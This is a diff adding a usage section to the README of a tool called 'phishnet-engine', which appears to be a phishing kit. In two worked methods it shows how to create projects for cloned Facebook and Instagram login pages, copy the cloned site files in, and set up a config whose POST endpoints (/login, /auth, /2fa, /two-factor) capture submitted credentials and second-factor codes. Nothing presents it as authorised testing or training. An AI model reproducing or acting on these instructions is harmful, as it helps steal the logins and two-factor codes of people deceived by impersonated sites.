@@ -121,3 +121,61 @@ phishnet-engine/
 | `endpoints` | POST routes to capture | `["/login", "/auth"]` |
 | `port` | Server port | `3000` |
 | `created` | Unix timestamp | `1678901234567` |
+
+## Two Ways to Use the Engine
+### Method 1: Create New Project (Recommended)
+
+```bash
+# 1. Run the engine
+node phishnetengine 
+
+# 2. Choose "Create new project"
+? Project setup: Create new project
+? Project name: facebook-login
+? Site name: facebook
+? Endpoints: /login,/auth,/2fa
+
+# 3. stop it press ctrl+c
+
+# 4. Engine CREATES everything automatically:
+#    - sites/facebook-login/ folder
+#    - sites/facebook-login/config.json
+#    - sites/facebook-login/css/ (empty)
+#    - sites/facebook-login/js/ (empty)
+#    - sites/facebook-login/img/ (empty)
+
+# 5. YOU paste your cloned site files:
+cp -r ~/Downloads/facebook-clone/* sites/facebook-login/
+
+# 6. Run again and load your project
+node phishnetengine
+# Choose "Load existing project" → select "facebook-login"
+
+```
+
+### Method 2: Load Existing Project (Manual Setup)
+
+```bash
+# 1. YOU create the project folder first
+mkdir -p sites/instagram-campaign
+
+# 2. YOU paste your cloned site files
+cp -r ~/Downloads/instagram-clone/* sites/instagram-campaign/
+
+# 3. YOU MUST create config.json manually
+#    Create file: sites/instagram-campaign/config.json
+
+{
+  "name": "instagram-campaign",
+  "site": "instagram",
+  "endpoints": ["/login", "/auth", "/two-factor"],
+  "port": 3000,
+  "created": 1678901234567
+}
+
+# 4. Run engine and load project
+node phishnetengine
+# Choose "Load existing project"
+# Select "instagram-campaign"
+```
+
